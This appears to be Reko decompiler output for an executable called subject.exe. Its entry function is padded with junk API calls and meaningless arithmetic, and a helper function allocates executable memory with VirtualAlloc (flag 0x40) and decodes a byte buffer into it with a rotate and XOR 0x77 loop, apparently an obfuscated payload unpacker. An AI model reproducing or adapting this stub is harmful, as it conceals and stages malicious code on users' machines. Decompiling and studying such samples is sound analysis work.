// subject.c
// Generated by decompiling subject.exe
// using Reko decompiler version VERSION

#include "subject.h"

// 004016CC: Register Eq_2 Win32CrtStartup()
Eq_2 Win32CrtStartup()
{
	ui32 edi_6 = edi | ebx;
	ui32 edx_18 = ~(edx + edi_6 - ecx);
	ui32 edx_24 = edx_18 ^ (eax | edx_18);
	ui32 esi_30 = (esi | 56002) - (ebx | 0xD3D7);
	ui32 ecx_31 = ecx - esi ^ edx_24;
	ui32 edi_35 = (edi_6 | 0xCBDE) & 54488;
	Eq_32 edx_40 = -edx_24;
	ui32 ecx_56 = (ecx_31 | 0xCC) - 0xCE;
	ui32 edi_58 = -(edi_35 ^ esi_30 - 0xC4C7);
	ui32 ebx_67 = ((ebx | 0xD3D7) + (ecx_31 | 0xCC) & ecx_56) + ~(GetDlgItem((struct HWND__ *) 0xC402FE84, edx_40) | (ecx_31 | 0xCC));
	ui32 esi_76 = ebx_67 ^ edi_58;
	GetMessageW(null, (struct HWND__ *) 3319579331, edx_40 ^ 55514, ~0x05100A53);
	lstrcmpiW(null, null);
	ui32 esi_89 = esi_76 + ecx_56;
	GetCurrentProcess();
	Eq_32 ecx_99 = ecx_56 ^ esi_89;
	Eq_87 esi_103 = esi_89 - ebx_67;
	Eq_89 edx_104 = (ecx_56 ^ 0xDDCE) + 0xCBCE;
	VirtualAlloc(0xD5D1, 3111292250, 0xD7, 0x00D7D5D4);
	GetDlgItem((struct HWND__ *) 3763657058, ecx_99);
	PostMessageW((struct HWND__ *) ~0x72F18998, 0xD5, esi_103, edx_104);
	ReleaseDC((struct HWND__ *) 2299931637, (struct HDC__ *) 0xF0856C61);
	lstrlenW(null);
	Eq_129 edx_142 = edx_104 - 0xC4 - (ecx_99 - (0xD6 - ecx_99) < 0x00);
	GetLastError();
	lstrlenW(null);
	GetCommandLineA();
	GetModuleHandleW(null);
	Eq_152 esi_162 = ~esi_103;
	word32 edx_167 = (edx_142 + (ecx_99 & 0xDDDB) & 0xD1D7) - 55003;
	LocalAlloc(edx_167 ^ 0xC5, 3870407798);
	GetModuleHandleA(null);
	ui32 esi_203 = ~(esi_162 ^ (edx_167 ^ 0xC5));
	FreeLibrary((struct HINSTANCE__ *) 2296986689);
	Eq_2 ebx_223 = 110510 - esi_203;
	GetSystemMetrics((word32) ebx_223 + 0x0000D1D2);
	Eq_2 esi_233 = ~esi_203;
	Eq_195 eax_239 = -QueryPerformanceCounter((LARGE_INTEGER *) 3367621806);
	Eq_65 edx_245 = (word32) esi_233 + ~edi_58;
	word32 edi_280 = SLICE(SEQ(ebx_223, CreateWindowExW(ebx_223, null, null, esi_233, 0xCCD0, ~0x31363430, eax_239, 3554594770, (struct HWND__ *) 0xDECD, (struct HMENU__ *) ~0x2F282332, (struct HINSTANCE__ *) ~0x443BA126, 0xD6) + 200) + 0xCBCE000000C8, word32, 32);
	SetTimer((struct HWND__ *) 3620340629, ~0x0430A0F8, edx_245, (void (*)(HWND, UINT, UINT_PTR, DWORD)) 0x8AD11386);
	Eq_246 edx_308 = ~edx_245;
	ui32 edi_312 = (-edi_280 & 0xC2CB) - edx_308;
	ui32 ecx_326 = eax - esi;
	Eq_255 edx_328 = -edx_308;
	ui32 esi_350 = ~(ebx | 0xD3D7);
	ui32 eax_342 = esi - ~edi_312;
	ui32 edx_353 = edx_328 - esi - (edx_328 == 0x00) & 0xC6 | esi_350;
	word32 ebx_354 = ~222;
	ui32 eax_365 = eax_342 + ((~ecx_326 - 0xCD) - eax_342);
	ui32 esi_377 = -esi_350 - edx_353;
	ui32 edx_395 = --(edx_353 ^ 0xCB);
	ui32 ebx_383 = -(ebx_354 + eax_365);
	ui32 ecx_390 = ~(eax_365 & esi_377);
	ui32 esi_400 = esi_377 ^ edx_395;
	ui32 edx_403 = edx_395 & esi_400;
	Eq_2 eax_411 = UpdateLayeredWindow((struct HWND__ *) 4040436283, (struct HDC__ *) 3234322907, (POINT *) 3586576856, (SIZE *) 0xD6, (struct HDC__ *) 0xCB, (POINT *) 14144452, 3687568862, (BLENDFUNCTION *) 0x00CFC8C1, 0x00C0D3D2);
	if (eax_411 != 0x00)
		return eax_411;
	GetCurrentThreadId();
	uint32 ebx_425 = (word32) eax_411 + (ebx_383 | 0xDBD2) + (ecx_390 - 0x01);
	uint32 edx_428 = edx_403 - 0xCF - (ebx_425 < 0x00);
	struct Eq_338 * esp_440 = fp - 0x04;
	do
	{
		uint64 ebx_edx_452 = SEQ(ebx_425, edx_428 - 54215);
		edx_428 = (word32) (ebx_edx_452 - 0xCEDB0000D3C7);
		ebx_425 = -SLICE(ebx_edx_452 - 0xCEDB0000D3C7, word32, 32);
		Eq_151 eax_467 = LoadLibraryA(esp_440->t0000);
		esp_440 = esp_440 + 0x01;
	} while (eax_467 != null);
	*(esp_440 - 0x04) = 14142428;
	*(esp_440 - 0x08) = ecx_390;
	*(esp_440 - 0x0C) = 0x00D5D3CC;
	*(esp_440 - 0x10) = 0xCF;
	*(esp_440 - 0x14) = 0x00D9D3D7;
	*(esp_440 - 0x18) = ecx_390;
	*(esp_440 - 0x1C) = ~0x3D282A30;
	ui32 ebx_499 = -(ebx_425 - 0x01 & edx_428);
	ui32 ecx_502 = ecx_390 - ebx_499;
	word32 ebx_507 = ebx_499 + (eax_467 + 0xCF);
	*(esp_440 - 0x20) = ebx_507;
	*(esp_440 - 0x24) = ecx_502 - 0x01;
	*(esp_440 - 0x28) = ebx_507;
	Eq_2 eax_518 = GetCurrentProcessId();
	*(esp_440 - 44) = edx_428 - 0x01;
	*(esp_440 - 0x30) = 13293012;
	Mem529[esp_440 - 0x34 + 0x00:word32] = eax_518 + 0xC0;
	*(esp_440 - 0x38) = 2339539282;
	word32 esi_521 = -(ecx_390 + (eax_467 + 0xCF));
	Eq_2 eax_532 = PostMessageW(*(esp_440 - 0x38), *(esp_440 - 0x34), *(esp_440 - 0x30), *(esp_440 - 44));
	GetCurrentProcessId();
	*(esp_440 - 44) = -(esi_521 - 0xCD - (eax_532 < 57035) ^ 0xCF);
	*(esp_440 - 0x30) = 0xCF;
	*(esp_440 - 0x34) = 3016361295;
	GetModuleFileNameA(*(esp_440 - 0x34), *(esp_440 - 0x30), *(esp_440 - 44));
	ui32 ebx_617 = *(esp_440 - 0x14);
	word32 edx_633 = *(esp_440 - 0x04);
	*(esp_440 - 0x04) = 2382498237;
	*(esp_440 - 0x08) = 0x8578F818;
	ReleaseDC(*(esp_440 - 0x08), *(esp_440 - 0x04));
	*(esp_440 - 0x04) = ~0x06EDE001;
	*(esp_440 - 0x08) = ~0x312B3628;
	*(esp_440 - 0x0C) = ~0x5A257153;
	*(esp_440 - 0x10) = 0x99554C52;
	Eq_594 eax_671 = -SetTimer(*(esp_440 - 0x10), *(esp_440 - 0x0C), *(esp_440 - 0x08), *(esp_440 - 0x04));
	*(esp_440 - 0x04) = ~0x00B00BE1;
	ui32 ecx_651 = edx_633 - 0x01 ^ 55255;
	ui32 ebx_666 = ebx_617 - 0x01 | ecx_651;
	ui32 esi_676 = eax_671 ^ 0xCBC5 | 0xC01E;
	uint32 eax_695 = (~(DestroyWindow(*(esp_440 - 0x04)) & 0xCF) ^ esi_676) - ecx_651;
	ui32 ebx_686 = ebx_666 + 0xD5 | ecx_651;
	ui32 edi_698 = (~((eax_671 ^ 0xCBC5) - 0xC5CC) ^ 0xD0) - 0xDA - (eax_695 < 0x00);
	ui32 eax_701 = eax_695 | ecx_651;
	word32 ecx_708;
	struct Eq_670 * ebx_709;
	word32 esi_710;
	fn00402EE2(eax_701, ecx_651, 0xC3C9, ebx_686, esi_676 & 211, edi_698, null, out ecx_708, out ebx_709, out esi_710);
	ebx_709->ptr0004 = fs;
	(ui32 *) 4181850410 = (ui32 *) 4181850410 & esp_440;
	byte * ecx_745 = esp_440[0x06];
	*ecx_745 = *ecx_745 & esp_440->b001D;
}

// 00402EE2: Register ui32 fn00402EE2(Register ui32 eax, Register ui32 ecx, Register word32 edx, Register ui32 ebx, Register ui32 esi, Register ui32 edi, Stack (ptr32 byte) dwArg00, Register out ptr32 ecxOut, Register out ptr32 ebxOut, Register out ptr32 esiOut)
ui32 fn00402EE2(ui32 eax, ui32 ecx, word32 edx, ui32 ebx, ui32 esi, ui32 edi, byte * dwArg00, ptr32 & ecxOut, ptr32 & ebxOut, ptr32 & esiOut)
{
	GetCommandLineW();
	GetCurrentProcess();
	LocalAlloc(0xC2C1, 0xA12F1DAC);
	Eq_96 eax_280 = VirtualAlloc(0x00, 27247, 0x3000, 0x40);
	byte * esi_345 = dwArg00;
	Eq_96 ecx_390 = eax_280;
	Eq_732 edx_418 = 0x1460;
	do
	{
		byte bh_474 = __rol(*esi_345, 22);
		word32 ebx_475 = DPB(0xDA, bh_474, 8);
		ui8 bh_498 = -(bh_474 ^ 0x77);
		word32 ebx_499 = DPB(ebx_475, bh_498, 8);
		*ecx_390 = bh_498;
		esi_345 = esi_345 + 0x01;
		*esiOut = esi_345;
		ecx_390 = ecx_390 + 0x01;
		edx_418 = edx_418 - 0x01;
	} while (edx_418 != 0x00);
	Eq_765 ebx_588 = -ebx_499;
	word32 ebx_591 = ebx_588 + edx_418;
	Eq_769 eax_593 = (ebx_588 == 0x00) - ((edx_418 - 0x9130CD66) - ebx_588);
	ui32 ecx_595 = ecx_390 | ebx_591;
	*ecxOut = ecx_595;
	word32 ebx_604;
	*ebxOut = (ebx_591 ^ 222) + ecx_595;
	return eax_593 - (ebx_591 ^ 222) ^ 220;
}

